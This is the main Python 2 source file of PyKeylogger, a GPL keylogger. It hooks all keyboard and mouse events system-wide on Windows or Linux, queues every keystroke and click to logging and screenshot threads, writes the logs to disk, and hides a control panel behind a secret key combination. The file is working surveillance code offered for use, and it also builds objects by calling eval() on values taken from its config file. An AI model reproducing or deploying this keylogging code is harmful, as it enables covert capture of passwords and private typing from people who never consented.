##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import os
import os.path
import time
import sys
if os.name == 'posix':
    import pyxhook as hooklib
elif os.name == 'nt':
    import pyHook as hooklib
    import pythoncom
else:
    print "OS is not recognised as windows or linux."
    exit()

import re
from optparse import OptionParser
import version
from configobj import ConfigObj, flatten_errors
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen, ExpirationScreen
import Tkinter, tkMessageBox
import myutils
from Queue import Empty, Queue
import threading
import logging
from myutils import _settings, _cmdoptions, _mainapp

# event processing threads
from detailedlogwriter import DetailedLogWriterFirstStage
from onclickimagecapture import OnClickImageCaptureFirstStage

class KeyLogger:
    '''Captures all keystrokes, enqueue events.
    
       Puts keystrokes events in queue for later processing by the LogWriter
       class.
       
       '''
    def __init__(self):
        self.parse_options() # stored in self.cmdoptions
        self.parse_config_file() # stored in self.settings
        self.NagscreenLogic()
        self.process_settings()
        _settings['settings'] = self.settings
        _cmdoptions['cmdoptions'] = self.cmdoptions
        _mainapp['mainapp'] = self
        
        self.create_log_directory(self.settings['General']['Log Directory'])
        os.chdir(self.settings['General']['Log Directory'])
        self.create_loggers()
        
        self.panel_trigger = threading.Lock()
        
        self.hookhub = HookHub(self.panel_trigger)
    
    def start(self):
        self.hookhub.start()
        
        while True:
            try:
                self.panel_trigger.acquire()
                self.logger.debug("Starting Control Panel")
                #self.control_key_hash.reset()
                PyKeyloggerControlPanel()
                self.panel_trigger.release()
            except SystemExit:
                raise
            except:
                self.logger.exception("Some exception happened in the "
                                        "control panel.")

    def process_settings(self):
        '''Sanitizes user input and detects full path of the log directory.
        
           We can change things in the settings configobj with impunity here,
           since the control panel process get a fresh read of settings from
           file before doing anything.
           
           '''
        log_dir = os.path.normpath(self.settings['General']['Log Directory'])
        if os.path.isabs(log_dir):
            self.settings['General']['Log Directory'] = log_dir
        else:
            self.settings['General']['Log Directory'] = \
               os.path.join(myutils.get_main_dir(), log_dir)
        
        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
        
        self.settings['General']['System Log'] = \
           self.filter.sub(r'__',self.settings['General']['System Log'])
    
    def create_log_directory(self, logdir):
        '''Make sure we have the directory where we want to log'''
        try:
            os.makedirs(logdir)
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                logging.getLogger('').error("error creating log directory", 
                        exc_info=True)
        except:
            logging.getLogger('').error("error creating log directory", 
                        exc_info=True)
            sys.exit(1)
    
    def create_loggers(self):
    
        # configure default root logger to log all debug messages to stdout
        if self.cmdoptions.debug:
            loglevel = logging.DEBUG
        else:
            loglevel = logging.CRITICAL
        
        logformatter = logging.Formatter("%(asctime)s %(name)-25s "
                "%(levelname)-10s %(filename)-25s %(lineno)-5d "
                "%(funcName)s %(message)s")
        rootlogger = logging.getLogger('')
        rootlogger.setLevel(logging.DEBUG)
        consolehandler = logging.StreamHandler(sys.stdout)
        consolehandler.setLevel(loglevel)
        consolehandler.setFormatter(logformatter)
        rootlogger.addHandler(consolehandler)
        
        # configure the "systemlog" handler to log all debug messages to file
        if self.settings['General']['System Log'] != 'None':
            systemlogpath = os.path.join(
                    self.settings['General']['Log Directory'], 
                    self.settings['General']['System Log'])
            systemloghandler = logging.FileHandler(systemlogpath)
            systemloghandler.setLevel(logging.DEBUG)
            systemloghandler.setFormatter(logformatter)
            rootlogger.addHandler(systemloghandler)
            
        self.logger = rootlogger
    
    def stop(self):
        '''Exit cleanly.'''
        self.hookhub.cancel()
        
        #print threading.enumerate()
        logging.shutdown()
        time.sleep(0.2) # give all threads time to clean up
        sys.exit()
    
    def parse_options(self):
        '''Read command line options.'''
        version_str = version.description + " version " + version.version + \
                      " (" + version.url + ")."
        parser = OptionParser(version=version_str)
        parser.add_option("-d", "--debug",
           action="store_true", dest="debug",
           help="debug mode (print output to console instead of the log file) "
                "[default: %default]")
        parser.add_option("-c", "--configfile",
           action="store", dest="configfile",
           help="filename of the configuration ini file. [default: %default]")
        parser.add_option("-v", "--configval",
           action="store", dest="configval",
           help="filename of the configuration validation file. "
                "[default: %default]")
        
        parser.set_defaults(debug=False,
                            configfile=version.name + ".ini",
                            configval=version.name + ".val")
        
        self.cmdoptions, args = parser.parse_args()
    
    def parse_config_file(self):
        '''Reads config file options from .ini file.
        
           Filename as specified by "--configfile" option,
           default "pykeylogger.ini".
           
           Validation file specified by "--configval" option,
           default "pykeylogger.val".
           
           Give detailed error box and exit if validation on the config file
           fails.
           
           '''
        
        if not os.path.isabs(self.cmdoptions.configfile):
            self.cmdoptions.configfile = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configfile)
        if not os.path.isabs(self.cmdoptions.configval):
            self.cmdoptions.configval = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configval)
            
        self.settings = ConfigObj(self.cmdoptions.configfile,
                                  configspec=self.cmdoptions.configval,
                                  list_values=False)

        # validate the config file
        errortext=["Some of your input contains errors. "
                    "Detailed error output below.",]
        
        val = Validator()
        val.functions['log_filename_check'] = myutils.validate_log_filename
        val.functions['image_filename_check'] = myutils.validate_image_filename
        valresult=self.settings.validate(val, preserve_errors=True)
        if valresult != True:
            for section_list, key, error in flatten_errors(self.settings, 
                                                                valresult):
                if key is not None:
                    section_list.append(key)
                else:
                    section_list.append('[missing section]')
                section_string = ','.join(section_list)
                if error == False:
                    error = 'Missing value or section.'
                errortext.append('%s: %s' % (section_string, error))
            tkMessageBox.showerror("Errors in config file. Exiting.", 
                        '\n\n'.join(errortext))
            sys.exit(1)

    def NagscreenLogic(self):
        '''Show the nagscreen (or not).'''
        
        # Congratulations, you have found the nag control.
        # See, that wasn't so hard, was it? :)
        # While I have deliberately made it easy to stop all this nagging and
        # expiration stuff here, and you are quite entitled to doing just that,
        # I would like to take this final moment and encourage you once more to
        # support the PyKeylogger project by making a donation.
        
        # Set this to False to get rid of all nagging.
        NagMe = True
        
        if NagMe == True:
            # first, show the support screen
            root = Tkinter.Tk()
            #root.geometry("100x100+200+200")
            root.withdraw()
            warn = SupportScreen(root, title="Please Support PyKeylogger")
            root.destroy()
            del(warn)
            
            # set the timer if first use
            utfnd = self.settings['General']['_Usage Time Flag']
            if myutils.password_recover(utfnd) == "firstuse":
                self.settings['General']['_Usage Time Flag'] = \
                   myutils.password_obfuscate(str(time.time()))
                self.settings.write()
            
            # then, see if we have "expired"
            utfnd = self.settings['General']['_Usage Time Flag']
            if abs(time.time() - float(myutils.password_recover(utfnd))) > \
               3600 * 24 * 4:
                root = Tkinter.Tk()
                #root.geometry("100x100+200+200")
                root.withdraw()
                warn = ExpirationScreen(root, title="PyKeylogger Has Expired")
                root.destroy()
                del(warn)
                sys.exit()

class HookHub(threading.Thread):
    '''Sets the hooks and spawns the first-level event and logging threads.
    
    This is separated from the main (starter) thread for the following reason:
    
    On windows, Tk needs to be started from main thread, otherwise it hangs. 
    This is possibly due to some interaction between the python message pump 
    and Tkinter. 
    On Linux, Tk needs to be started from a thread distinct from the hooking 
    thread. That is the case because pyxhook blocks until GUI exits when we 
    call it directly from a hook function.
    
    So, we move the actual hooking off the main thread, to satisfy both with 
    the same code.
    '''
    
    def __init__(self, panel_trigger):
        threading.Thread.__init__(self)
        
        self.panel_trigger = panel_trigger
        self.settings = _settings['settings']
        self.cmdoptions = _cmdoptions['cmdoptions']
        self.mainapp = _mainapp['mainapp']
        
        # create an empty logger - will just pass through to root logger.
        self.logger = logging.getLogger('HookHub')
        
        self.parse_control_key()

        self.spawn_event_threads()
        
        self.hashchecker = ControlKeyMonitor(self.control_key_hash, 
                            self.panel_trigger)
        self.hm = hooklib.HookManager()
        
        if self.settings['General']['Hook Keyboard'] == True:
            self.hm.HookKeyboard()
            self.hm.KeyDown = self.OnKeyDownEvent
            self.hm.KeyUp = self.OnKeyUpEvent
        
        if self.settings['General']['Hook Mouse'] == True:
            self.hm.HookMouse()
            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
        
    def parse_control_key(self):
        self.control_key_hash = \
           ControlKeyHash(self.settings['General']['Control Key'])

    def spawn_event_threads(self):
        self.event_threads = {}
        self.queues = {}
        self.logger.debug(self.settings.sections)
        for section in self.settings.sections:
            try:
                threadname = self.settings[section]['General']['_Thread_Class']
                self.queues[section] = Queue(0)
                self.event_threads[section] = \
                    eval(self.settings[section]['General']['_Thread_Class'] + \
                    '(self.queues[section], section)')
            except KeyError:
                self.logger.debug('not creating thread for section %s' % \
                                        section, exc_info=True)
                pass # this is not a thread to be started.

    def OnKeyDownEvent(self, event):
        '''Called when a key is pressed.
        
           Puts the event in queue, updates the control key combo status,
           and passes the event on to the system.
           
           '''
        self.push_event_to_queues(event)
        self.control_key_hash.update(event)
        return True
    
    def OnKeyUpEvent(self,event):
        self.control_key_hash.update(event)
        return True
    
    def OnMouseDownEvent(self,event):
        self.push_event_to_queues(event)
        return True

    def push_event_to_queues(self, event):
        for key in self.queues.keys():
            self.logger.debug('Sticking event into queue %s' % key)
            self.queues[key].put(event)

    def run(self):
        for key in self.event_threads.keys():
            if self.settings[key]['General']['Enable ' + key]:
                self.logger.debug('Starting thread %s: %s' % \
                                (key, self.event_threads[key]))
                self.event_threads[key].start()
            else:
                self.logger.debug('Not starting thread %s: %s' % \
                                (key, self.event_threads[key]))
        
        self.hashchecker.start()
        
        if os.name == 'nt':
            pythoncom.PumpMessages()
        if os.name == 'posix':
            self.hm.start()

    def cancel(self):
        '''Exit cleanly.'''
        self.hashchecker.cancel()
        
        if os.name == 'posix':
            self.hm.cancel()
        
        for key in self.event_threads.keys():
            self.event_threads[key].cancel()
        
        logging.shutdown()
        time.sleep(0.2) # give all threads time to clean up
        sys.exit()


class ControlKeyHash:
    '''Encapsulates the control key dictionary.
       
       This dictionary is used to keep track of whether the control key combo
       has been pressed.
       
       '''
    def __init__(self, controlkeysetting):
        self.cmdoptions = _cmdoptions['cmdoptions']
        
        lin_win_dict = {'Alt_l':'Lmenu',
                        'Alt_r':'Rmenu',
                        'Control_l':'Lcontrol',
                        'Control_r':'Rcontrol',
                        'Shift_l':'Lshift',
                        'Shift_r':'Rshift',
                        'Super_l':'Lwin',
                        'Super_r':'Rwin',
                        'Page_up':'Prior'}
                                    
        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
        
        self.controlKeyList = controlkeysetting.split(';')
        
        # Capitalize all items for greater tolerance of variant user inputs.
        self.controlKeyList = \
           [item.capitalize() for item in self.controlKeyList]
        # Remove duplicates.
        self.controlKeyList = list(set(self.controlKeyList))
        
        # Translate linux versions of key names to windows, or vice versa,
        # depending on what platform we are on.
        if os.name == 'nt':
            for item in self.controlKeyList:
                if item in lin_win_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                       lin_win_dict[item]
        elif os.name == 'posix':
            for item in self.controlKeyList:
                if item in win_lin_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                       lin_win_dict[item]
        
        self.controlKeyHash = dict(zip(
           self.controlKeyList,
           [False for item in self.controlKeyList]))
    
    def update(self, event):
        if event.MessageName == 'key down' and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = True
        if event.MessageName == 'key up' and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = False
            
        if self.cmdoptions.debug:
            logging.getLogger('').debug("control key status: " + \
                    str(self.controlKeyHash))

    def reset(self):
        for key in self.controlKeyHash.keys():
            self.controlKeyHash[key] = False
    
    def check(self):
        if self.controlKeyHash.values() == [True] * len(self.controlKeyHash):
            logging.getLogger('').debug('Control key combo detected.')
            return True
        else:
            return False
            
    def __str__(self):
        return str(self.controlKeyHash)

class ControlKeyMonitor(threading.Thread):
    '''Polls the control key hash status periodically.
       
       Done to see if the control key combo has been pressed.
       Brings up control panel if it has.
       
       '''
    def __init__(self, control_key_hash, panel_trigger):
        threading.Thread.__init__(self)
        self.finished = threading.Event()
                
        self.mainapp = _mainapp['mainapp']
        self.control_key_hash = control_key_hash
        self.panel_trigger = panel_trigger
        self.panel_trigger.acquire()
        
    def run(self):
        while not self.finished.isSet():
            time.sleep(0.05)
            if self.control_key_hash.check():
                try:
                    logging.getLogger('').debug("Triggering Control Panel")
                    self.panel_trigger.release()
                    time.sleep(0.05) # give panel chance to grab lock
                    self.panel_trigger.acquire()
                except RuntimeError:
                    logging.getLogger('').debug("Looks like panel is already running.")
        
    def cancel(self):
        self.finished.set()
        

if __name__ == '__main__':
    kl = KeyLogger()
    kl.start()
    
    # If you want to change keylogger behavior from defaults,
    # modify the .ini file. Also try '-h' for list of command line options.
